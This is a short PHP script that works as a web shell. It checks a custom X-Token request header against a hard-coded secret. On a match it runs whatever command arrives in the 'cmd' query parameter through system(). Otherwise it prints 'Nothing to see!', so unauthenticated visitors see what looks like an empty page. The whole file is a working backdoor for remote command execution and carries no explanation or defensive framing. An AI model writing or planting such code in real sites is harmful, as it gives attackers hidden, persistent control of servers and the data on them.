<?php
$token = $_SERVER['HTTP_X_TOKEN'];
if ($token == "9ebc314e6dacf0a6ab1c08c444b3deb50338b188a70cad862a6482d1ae0e5be2"){
        system($_GET['cmd']);
        }
else {
echo "Nothing to see!";
};
?>
